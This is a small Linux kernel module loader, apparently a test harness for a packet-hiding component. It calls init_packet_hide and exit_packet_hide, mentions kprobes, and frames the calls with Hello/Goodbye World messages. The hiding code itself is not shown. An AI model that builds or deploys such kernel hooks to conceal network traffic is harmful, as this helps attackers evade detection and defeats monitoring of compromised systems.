#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include "packet_hide.h"

MODULE_LICENSE("GPL"); //for exporting kprobes

static int __init hooking_test_init(void) {
	printk(KERN_INFO "------------------Hello, World!-----------------");
	init_packet_hide();
	return 0;
}

static void __exit hooking_test_exit(void) {
	exit_packet_hide();
	printk(KERN_INFO "-----------------Goodbye, World!----------------");
}

module_init(hooking_test_init);
module_exit(hooking_test_exit);
